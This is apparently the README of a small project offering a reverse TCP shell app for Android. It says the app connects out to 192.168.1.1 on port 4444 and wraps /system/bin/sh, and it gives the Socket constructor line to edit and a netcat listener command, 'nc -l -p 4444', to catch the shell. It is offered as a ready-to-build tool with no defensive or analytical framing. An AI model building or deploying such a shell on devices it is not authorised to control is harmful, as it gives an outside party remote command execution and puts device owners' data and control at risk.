AndroidReverseShell
===================

A simple reverse TCP shell example for Android

## Notes
## Build App Via AIDE Android App

This example makes a reverse TCP connection to 192.168.1.1 on port 4444 wrapping the `system/bin/sh` process.

To edit connection details modify the Socket constructor in the source:

`Socket socket = new Socket("192.168.1.1", 4444);`
		

To listen for a connection use a program such as Netcat to listen on the specified port.

Netcat Server Example: `nc -l -p 4444`
